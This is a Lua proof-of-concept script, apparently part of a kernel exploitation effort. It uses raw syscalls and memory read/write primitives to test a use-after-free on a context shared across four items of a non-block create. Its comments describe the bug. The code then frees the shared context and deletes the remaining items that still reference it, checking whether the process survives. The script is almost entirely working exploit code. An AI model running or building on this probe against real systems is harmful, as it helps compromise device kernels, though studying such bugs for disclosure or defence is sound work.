-- CRASH_CLASS: HIGH
-- PROBE 546a: non-block create shares one context across all items
--
-- Context: 528a used block mode (flags 0x1001), where the entry count equals
-- the item count and one delete call frees every item plus the shared 0x30
-- context. Non-block mode (flags 1) sets the entry count to 1 regardless of
-- the item count, and all items still carry the same [W+0x18] context pointer.
-- If that is right, deleting ONE item of a four-item non-block create frees the
-- shared context while the other three ids still reference it, with no race
-- needed at all.
--
-- [A] create count=4 non-block, [B] poll all, [C] read the ids, [D] delete id0,
-- [E] delete id1 - the first delete that would follow a freed context.

print("=== PROBE 546a: SHARED CONTEXT DANGLING ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end
print("[0] pid=" .. pid_val)

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local cell = memory.alloc(16)
local poll_out = memory.alloc(0x40)

for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
wq(N(out_id), uint64(0))
local rv = N(sc_create(uint64(1), uint64(N(data)), uint64(4), uint64(1), uint64(N(out_id))))
local base = rd(N(out_id)) or 0
print(string.format("[A] create ret=%d base=%08X alive=%s", rv, base, tostring(alive())))
local ids = {}
for i = 0, 3 do
    ids[i] = base + i * 0x10000
    wd(N(cell), ids[i])
    wd(N(poll_out), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
    print(string.format("    id%d=%08X poll=%08X", i, ids[i], rd(N(poll_out)) or 0))
end

local function del(tag, id)
    local st = memory.alloc(0x40)
    wd(N(st), 0xCCCCCCCC)
    wd(N(cell), id)
    local ok, r = pcall(function() return sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
    print(string.format("%s delete id=%08X ok=%s ret=%s status=%08X alive=%s",
        tag, id, tostring(ok), tostring(N(r)), rd(N(st)) or 0, tostring(alive())))
end

print("[C] deleting item 0 only")
del("[D]", ids[0])
print("[E] deleting item 1, which shares the freed context")
del("[F]", ids[1])
print("[G] deleting item 2")
del("[H]", ids[2])
print("[I] deleting item 3")
del("[J]", ids[3])
print("=== DONE ===")
